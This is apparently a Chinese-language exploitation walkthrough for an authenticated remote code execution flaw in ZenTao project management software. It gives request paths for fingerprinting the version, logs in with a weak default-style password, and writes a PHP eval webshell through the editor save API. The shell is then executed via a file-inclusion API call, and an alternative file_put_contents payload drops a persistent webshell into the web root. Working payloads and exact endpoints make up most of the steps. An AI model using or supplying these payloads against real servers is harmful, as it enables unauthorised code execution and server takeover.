<a name="5AIqw"></a>
## 注意点：
**后台漏洞**<br />**api-getModel-editor-save-filePath         写入**<br />**api-getModel-api-getMethod-filePath   执行**<br />**文件包含shell的时候记得带上cookie**

1.      构造路径 ：/index.php?mode=getconfig 获取当前zentao版本<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1628044738974-4fc434a3-721d-467f-8d0b-8e6f46b52539.png#align=left&display=inline&height=151&originHeight=151&originWidth=1201&size=71236&status=done&style=none&width=1201)<br />2.      使用密码123456进入后台。该漏洞为后台利用漏洞。<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1628044754497-e31af690-f6e8-4565-abe8-b11fe90b8192.png#align=left&display=inline&height=533&originHeight=533&originWidth=1145&size=160140&status=done&style=none&width=1145)<br />3.       使用burp抓包构造/api-getModel-editor-save-filePath方法post请求写入php文件<br />/api-getModel-editor-save-filePath=<br />fileContent=<?php @eval($_POST[a]);?><br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1628044773098-cf369184-11c4-49db-b356-c161e0ff0ae5.png#align=left&display=inline&height=463&originHeight=463&originWidth=1002&size=180101&status=done&style=none&width=1002)

4.      构造api-getModel-api-getMethod-filePath方法使用get请求执行php代码<br />[http://192.168.201.135:8084/api-getModel-api-getMethod-filePath=/tmp/shell/1](http://192.168.201.135:8084/api-getModel-api-getMethod-filePath=/tmp/shell/1)<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1628044819368-0586294b-5b00-417e-97a2-85a56e18b195.png#align=left&display=inline&height=685&originHeight=685&originWidth=1037&size=471924&status=done&style=none&width=1037)
<a name="czpsu"></a>
## 通过包含直接shell
 ![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1628044955642-82160f78-8cba-4378-a8f9-7c9372dad015.png#align=left&display=inline&height=518&originHeight=518&originWidth=1279&size=69645&status=done&style=none&width=1279)<br />然后再访问<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1628044975365-29f091b0-f97e-4c86-95d6-c5f46ba893e7.png#align=left&display=inline&height=320&originHeight=320&originWidth=1339&size=65548&status=done&style=none&width=1339)<br />连一句话，**记得带上cookie**<br />**![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1628045165277-6f77d32d-1901-4a2c-8630-deae35caf433.png#align=left&display=inline&height=186&originHeight=186&originWidth=632&size=8794&status=done&style=none&width=632)**<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1628044999279-322a242f-2a19-47dd-aa7d-0d8fb5693b51.png#align=left&display=inline&height=671&originHeight=671&originWidth=1253&size=76623&status=done&style=none&width=1253)
<a name="6yTNn"></a>
## file_put_contents写shell
5.      通过构造报错路径 /api-getModel-api-getMethod-filePath=/tmp/shell1/1获得物理路径。<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1628044840404-8ad3f7bc-0651-4060-87d4-df30d31aa999.png#align=left&display=inline&height=256&originHeight=256&originWidth=1071&size=155161&status=done&style=none&width=1071)

6.      然后通过file_put_contents函数对物理路径写入webshell<br />fileContent=<?php file_put_contents('/app/zentaopms/www/1.php', '<?php @eval($_POST[a]); ?>');?><br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1628044850472-d91c2ca4-94b5-4c60-b362-668c23c13807.png#align=left&display=inline&height=445&originHeight=445&originWidth=1046&size=176917&status=done&style=none&width=1046)<br />7.      访问[http://192.168.201.135:8084//api-getModel-api-getMethod-filePath=/tmp/shell1/1](http://192.168.201.135:8084//api-getModel-api-getMethod-filePath=/tmp/shell1/1)文件，让文件执行php代码。<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1628044873265-39304d8b-fa7c-4b67-a770-68496ba3f215.png#align=left&display=inline&height=239&originHeight=239&originWidth=1050&size=151422&status=done&style=none&width=1050)<br />8.      访问网站根目录，看页面能否解析。如果可以则连接webshell。如图下所示，访问webshell没有报错，证明已解析，成功连接webshell。<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1628044891046-1afbaee9-95ff-4a0f-aabe-c1b30e484b4b.png#align=left&display=inline&height=408&originHeight=544&originWidth=815&size=102918&status=done&style=none&width=611)
